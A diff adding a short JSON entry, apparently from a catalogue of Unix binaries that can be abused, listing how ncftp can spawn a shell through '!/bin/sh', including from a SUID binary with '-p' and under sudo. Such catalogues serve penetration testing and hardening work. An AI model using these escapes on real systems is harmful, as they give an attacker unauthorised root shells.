@@ -1,0 +1,19 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "ncftp\n!/bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./ncftp\n!/bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ncftp\n!/bin/sh\n"
+      }
+    ]
+  }
+}
